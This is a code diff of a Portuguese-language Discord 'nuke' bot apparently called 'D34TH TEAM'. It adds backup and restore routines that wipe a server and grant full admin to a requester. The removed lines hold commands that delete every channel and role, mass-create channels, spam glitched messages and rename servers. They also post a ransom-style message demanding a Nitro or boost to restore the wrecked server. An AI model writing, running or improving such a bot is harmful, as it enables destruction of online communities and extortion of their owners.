@@ -6,14 +6,16 @@ import os
 import sys
 import random
 import json
+import aiohttp
 from dotenv import load_dotenv
 import threading
 from flask import Flask
-import aiohttp
+from datetime import datetime
 
 load_dotenv()
 
 TOKEN = os.getenv('DISCORD_TOKEN')
+
 if not TOKEN:
     print("TOKEN nao encontrado!")
     sys.exit(1)
@@ -33,7 +35,7 @@ def run_flask():
 threading.Thread(target=run_flask, daemon=True).start()
 
 nuke_active = False
-backup_servidores = {}  # Guarda nome e estrutura dos servidores
+backup_data = {}  # Armazena backups dos servidores
 
 def load_text():
     try:
@@ -82,29 +84,222 @@ async def glitch_message(ctx, mensagem, tempo=10):
 
 BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=0&scope=bot+applications.commands"
 
-# ========== BACKUP ESTRUTURA ==========
-def backup_guild(guild):
+# ========== FUNÇÃO DE BACKUP COMPLETO ==========
+async def fazer_backup(guild):
+    """Salva TUDO do servidor: canais, cargos, permissões, categorias"""
     backup = {
-        "name": guild.name,
-        "channels": [],
-        "roles": []
+        "nome": guild.name,
+        "icone": str(guild.icon.url) if guild.icon else None,
+        "categorias": [],
+        "canais_texto": [],
+        "canais_voz": [],
+        "foruns": [],
+        "cargos": [],
+        "membros": {}
     }
-    for channel in guild.channels:
-        backup["channels"].append({
-            "name": channel.name,
-            "type": str(channel.type),
-            "position": channel.position
+    
+    # Salvar categorias
+    for categoria in guild.categories:
+        backup["categorias"].append({
+            "nome": categoria.name,
+            "posicao": categoria.position,
+            "id": categoria.id
         })
-    for role in guild.roles:
-        if role.name != "@everyone":
-            backup["roles"].append({
-                "name": role.name,
-                "permissions": role.permissions.value,
-                "color": role.color.value,
-                "hoist": role.hoist,
-                "mentionable": role.mentionable
+    
+    # Salvar canais de texto
+    for canal in guild.text_channels:
+        backup["canais_texto"].append({
+            "nome": canal.name,
+            "posicao": canal.position,
+            "categoria_id": canal.category_id,
+            "topic": canal.topic,
+            "slowmode_delay": canal.slowmode_delay,
+            "nsfw": canal.nsfw
+        })
+    
+    # Salvar canais de voz
+    for canal in guild.voice_channels:
+        backup["canais_voz"].append({
+            "nome": canal.name,
+            "posicao": canal.position,
+            "categoria_id": canal.category_id,
+            "bitrate": canal.bitrate,
+            "user_limit": canal.user_limit
+        })
+    
+    # Salvar fóruns
+    for forum in guild.forums:
+        backup["foruns"].append({
+            "nome": forum.name,
+            "posicao": forum.position,
+            "categoria_id": forum.category_id,
+            "topic": forum.topic
+        })
+    
+    # Salvar cargos
+    for cargo in guild.roles:
+        if cargo.name != "@everyone":
+            backup["cargos"].append({
+                "nome": cargo.name,
+                "cor": cargo.color.value,
+                "permissoes": cargo.permissions.value,
+                "posicao": cargo.position,
+                "hoist": cargo.hoist,
+                "mentionable": cargo.mentionable
             })
+    
+    # Salvar membros e seus cargos
+    for member in guild.members:
+        if not member.bot:
+            cargos = [role.id for role in member.roles if role.name != "@everyone"]
+            if cargos:
+                backup["membros"][str(member.id)] = cargos
+    
     return backup
+
+# ========== FUNÇÃO DE RESTAURAÇÃO ==========
+async def restaurar_servidor(guild, backup, admin_user_id):
+    """Restaura o servidor exatamente como estava no backup"""
+    try:
+        # Apaga tudo primeiro
+        for channel in guild.channels:
+            try:
+                await channel.delete()
+            except:
+                pass
+        
+        for role in guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                except:
+                    pass
+        
+        # Recriar cargos (primeiro para poder atribuir depois)
+        cargos_criados = {}
+        for cargo_data in backup["cargos"]:
+            try:
+                cargo = await guild.create_role(
+                    name=cargo_data["nome"],
+                    color=cargo_data["cor"],
+                    permissions=discord.Permissions(cargo_data["permissoes"]),
+                    hoist=cargo_data["hoist"],
+                    mentionable=cargo_data["mentionable"]
+                )
+                cargos_criados[cargo_data["nome"]] = cargo
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        
+        # Recriar categorias
+        categorias_criadas = {}
+        for cat_data in backup["categorias"]:
+            try:
+                categoria = await guild.create_category(cat_data["nome"])
+                categorias_criadas[cat_data["nome"]] = categoria
+                await asyncio.sleep(0.05)
+            except:
+                pass
+        
+        # Recriar canais de texto
+        for canal_data in backup["canais_texto"]:
+            try:
+                categoria = None
+                if canal_data["categoria_id"]:
+                    # Tenta encontrar a categoria pelo nome
+                    for cat in backup["categorias"]:
+                        if cat["id"] == canal_data["categoria_id"]:
+                            if cat["nome"] in categorias_criadas:
+                                categoria = categorias_criadas[cat["nome"]]
+                            break
+                
+                canal = await guild.create_text_channel(
+                    canal_data["nome"],
+                    category=categoria,
+                    topic=canal_data.get("topic"),
+                    slowmode_delay=canal_data.get("slowmode_delay", 0),
+                    nsfw=canal_data.get("nsfw", False)
+                )
+                await asyncio.sleep(0.03)
+            except:
+                pass
+        
+        # Recriar canais de voz
+        for canal_data in backup["canais_voz"]:
+            try:
+                categoria = None
+                if canal_data["categoria_id"]:
+                    for cat in backup["categorias"]:
+                        if cat["id"] == canal_data["categoria_id"]:
+                            if cat["nome"] in categorias_criadas:
+                                categoria = categorias_criadas[cat["nome"]]
+                            break
+                
+                canal = await guild.create_voice_channel(
+                    canal_data["nome"],
+                    category=categoria,
+                    bitrate=canal_data.get("bitrate", 64000),
+                    user_limit=canal_data.get("user_limit", 0)
+                )
+                await asyncio.sleep(0.03)
+            except:
+                pass
+        
+        # Recriar fóruns
+        for forum_data in backup["foruns"]:
+            try:
+                categoria = None
+                if forum_data["categoria_id"]:
+                    for cat in backup["categorias"]:
+                        if cat["id"] == forum_data["categoria_id"]:
+                            if cat["nome"] in categorias_criadas:
+                                categoria = categorias_criadas[cat["nome"]]
+                            break
+                
+                forum = await guild.create_forum_channel(
+                    forum_data["nome"],
+                    category=categoria,
+                    topic=forum_data.get("topic")
+                )
+                await asyncio.sleep(0.03)
+            except:
+                pass
+        
+        # Restaurar nome e ícone do servidor
+        try:
+            await guild.edit(name=backup["nome"])
+            if backup["icone"]:
+                # Baixar ícone antigo (se disponível)
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(backup["icone"]) as resp:
+                        if resp.status == 200:
+                            await guild.edit(icon=await resp.read())
+        except:
+            pass
+        
+        # Atribuir cargos aos membros
+        admin_member = guild.get_member(admin_user_id)
+        if admin_member:
+            # Criar cargo de admin para o usuário que pediu
+            admin_role = await guild.create_role(name="ADMIN-D34TH", permissions=discord.Permissions.all())
+            await admin_member.add_roles(admin_role)
+        
+        # Atribuir outros cargos
+        for user_id, cargos_ids in backup["membros"].items():
+            member = guild.get_member(int(user_id))
+            if member:
+                for cargo_nome in cargos_ids:
+                    if cargo_nome in cargos_criados:
+                        try:
+                            await member.add_roles(cargos_criados[cargo_nome])
+                            await asyncio.sleep(0.02)
+                        except:
+                            pass
+        
+        return True
+    except Exception as e:
+        print(f"Erro na restauração: {e}")
+        return False
 
 # ========== BOTÃO REVERTER ==========
 class ReverterButton(ui.View):
@@ -116,7 +311,6 @@ class ReverterButton(ui.View):
     @ui.button(label="REVERTER", style=ButtonStyle.green, custom_id="reverter")
     async def reverter_callback(self, interaction: discord.Interaction, button: ui.Button):
         try:
-            # Envia pedido para o servidor de suporte
             support_guild = bot.get_guild(1545604817324347482)
             if support_guild:
                 channel = discord.utils.get(support_guild.channels, name="pedidos")
@@ -149,32 +343,30 @@ class ConfirmarReversao(ui.View):
         try:
             guild = bot.get_guild(self.guild_id)
             if guild:
-                # Recria estrutura básica
-                for channel in guild.channels:
-                    try:
-                        await channel.delete()
-                    except:
-                        pass
-                
-                # Cria canais básicos
-                for i in range(5):
-                    await guild.create_text_channel(f"recover-{i+1}")
-                
-                # Dá admin para o usuário
-                member = guild.get_member(self.user_id)
-                if member:
-                    # Cria cargo admin
-                    admin_role = await guild.create_role(name="ADMIN", permissions=discord.Permissions.all())
-                    await member.add_roles(admin_role)
-                    await guild.edit(name="RECUPERADO")
+                if self.guild_id in backup_data:
+                    backup = backup_data[self.guild_id]
+                    await interaction.response.send_message("🔄 Iniciando restauração completa do servidor...", ephemeral=True)
                     
-                    await interaction.response.send_message("✅ Servidor recuperado com sucesso! Admin concedido.", ephemeral=True)
+                    sucesso = await restaurar_servidor(guild, backup, self.user_id)
+                    
+                    if sucesso:
+                        await interaction.followup.send("✅ **SERVIDOR RESTAURADO COM SUCESSO!**\n\nTodas as categorias, canais, cargos e permissões foram recuperados!", ephemeral=True)
+                        # Envia mensagem no servidor restaurado
+                        if guild.text_channels:
+                            embed = discord.Embed(
+                                title="🔄 SERVIDOR RECUPERADO",
+                                description=f"O servidor foi restaurado por {interaction.user.mention}\n\nEstrutura original recuperada!",
+                                color=discord.Color.green()
+                            )
+                            await guild.text_channels[0].send(embed=embed)
+                    else:
+                        await interaction.followup.send("❌ Erro durante a restauração!", ephemeral=True)
                 else:
-                    await interaction.response.send_message("❌ Usuário não está mais no servidor.", ephemeral=True)
+                    await interaction.followup.send("❌ Backup não encontrado para este servidor!", ephemeral=True)
             else:
-                await interaction.response.send_message("❌ Servidor não encontrado.", ephemeral=True)
+                await interaction.followup.send("❌ Servidor não encontrado!", ephemeral=True)
         except Exception as e:
-            await interaction.response.send_message(f"❌ Erro: {str(e)}", ephemeral=True)
+            await interaction.followup.send(f"❌ Erro: {str(e)}", ephemeral=True)
 
 # ========== EVENTOS ==========
 @bot.event
@@ -339,167 +531,4 @@ async def nuke(ctx):
             if isinstance(canal, discord.TextChannel):
                 try:
                     msg = await canal.send(mensagem_base)
-                    for _ in range(2):
-                        await msg.edit(content=glitch_text(mensagem_base, 3))
-                        await asyncio.sleep(0.1)
-                    await msg.edit(content=mensagem_base)
-                    enviadas += 1
-                    await asyncio.sleep(0.01)
-                except:
-                    pass
         
-        embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
-        if guild.text_channels:
-            await guild.text_channels[0].send(embed=embed)
-            
-    except Exception as e:
-        print(f"Erro nuke: {e}")
-    finally:
-        nuke_active = False
-
-@bot.command()
-async def end(ctx):
-    global nuke_active
-    try:
-        await ctx.message.delete()
-        nuke_active = True
-        guild = ctx.guild
-        
-        # Salva nome do servidor
-        nome_antigo = guild.name
-        
-        # Apaga tudo
-        for channel in guild.channels:
-            try:
-                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
-                    await channel.delete()
-                    await asyncio.sleep(0.02)
-            except:
-                pass
-        
-        for role in guild.roles:
-            if role.name != "@everyone":
-                try:
-                    await role.delete()
-                except:
-                    pass
-        
-        try:
-            await guild.edit(name="D34TH TEAM")
-        except:
-            pass
-        
-        # Cria canal único (somente leitura)
-        canal_recuperacao = await guild.create_text_channel("💀-RECUPERACAO")
-        
-        # Configura permissões: só o bot pode enviar mensagem
-        await canal_recuperacao.set_permissions(guild.default_role, send_messages=False, read_messages=True)
-        
-        # Mensagem com botão REVERTER
-        embed = discord.Embed(
-            title="💀 SERVIDOR DESTRUÍDO",
-            description=(
-                "PARA RECUPERAR ESTE SERVIDOR ENTRE NO SERVIDOR ABAIXO E DE UM BOOST OU NITRO A UM DOS ADMINS\n\n"
-                f"**Link:** https://discord.gg/YsgNdA83d\n\n"
-                "Clique no botão abaixo para solicitar a reversão."
-            ),
-            color=discord.Color.dark_gray()
-        )
-        embed.set_footer(text="D34TH TEAM")
-        
-        view = ReverterButton(guild.id, nome_antigo)
-        await canal_recuperacao.send(embed=embed, view=view)
-        
-        print(f"Servidor {guild.name} destruído. Canal de recuperação criado.")
-        
-    except Exception as e:
-        print(f"Erro end: {e}")
-    finally:
-        nuke_active = False
-
-@bot.command()
-async def rename_all(ctx):
-    try:
-        await ctx.message.delete()
-        guild = ctx.guild
-        contador = 0
-        for channel in guild.channels:
-            if isinstance(channel, discord.TextChannel):
-                try:
-                    await channel.edit(name="d34th-team")
-                    contador += 1
-                    await asyncio.sleep(0.1)
-                except:
-                    pass
-        try:
-            await guild.edit(name="D34TH TEAM")
-            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
-            async with aiohttp.ClientSession() as session:
-                async with session.get(avatar_url) as resp:
-                    if resp.status == 200:
-                        await guild.edit(icon=await resp.read())
-        except:
-            pass
-        embed = discord.Embed(title="RENOMEADO", description=f"{contador} canais", color=discord.Color.dark_gray())
-        await ctx.send(embed=embed, delete_after=5)
-    except Exception as e:
-        await ctx.send(f'Erro: {e}', delete_after=5)
-
-@bot.command()
-async def set_text(ctx, *, texto):
-    try:
-        await ctx.message.delete()
-        if update_text(texto):
-            embed = discord.Embed(title="TEXTO ATUALIZADO", description=f"{texto}", color=discord.Color.dark_gray())
-            await ctx.send(embed=embed, delete_after=5)
-    except Exception as e:
-        await ctx.send(f'Erro: {e}', delete_after=5)
-
-@bot.command()
-async def create_channels(ctx, quantidade: int = 10):
-    try:
-        await ctx.message.delete()
-        if quantidade > 500:
-            quantidade = 500
-        criados = 0
-        for i in range(quantidade):
-            try:
-                await ctx.guild.create_text_channel(f"channel-{i+1}")
-                criados += 1
-                await asyncio.sleep(0.02)
-            except:
-                break
-        embed = discord.Embed(title="CRIADOS", description=f"{criados} canais", color=discord.Color.dark_gray())
-        await ctx.send(embed=embed, delete_after=5)
-    except Exception as e:
-        await ctx.send(f'Erro: {e}', delete_after=5)
-
-@bot.command()
-async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
-    try:
-        await ctx.message.delete()
-        target = canal or ctx.channel
-        texto = load_text()
-        for i in range(quantidade):
-            msg = f"{texto}\nD34TH TEAM\n{i+1}/{quantidade}"
-            await glitch_message(target, msg, 3)
-            await asyncio.sleep(0.05)
-        await ctx.send(f"{quantidade} enviadas", delete_after=5)
-    except Exception as e:
-        await ctx.send(f'Erro: {e}', delete_after=5)
-
-@bot.command()
-async def help_bot(ctx):
-    embed = discord.Embed(title="D34TH BOT", description="COMANDOS", color=discord.Color.dark_gray())
-    embed.add_field(name="COMANDOS", value="`•invite`\n`•button`\n`•glitch`\n`•ping`\n`•nuke`\n`•end`\n`•rename_all`\n`•set_text`\n`•create_channels`\n`•spam`\n`•update_server_icon`", inline=False)
-    embed.add_field(name="ESTATISTICAS", value=f"SERVIDORES: {len(bot.guilds)}\nUSUARIOS: {len(bot.users)}", inline=True)
-    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
-    embed.set_footer(text="D34TH TEAM")
-    await ctx.send(embed=embed)
-
-if __name__ == "__main__":
-    print("Iniciando D34TH TEAM...")
-    try:
-        bot.run(TOKEN)
-    except Exception as e:
-        print(f"Erro: {e}")
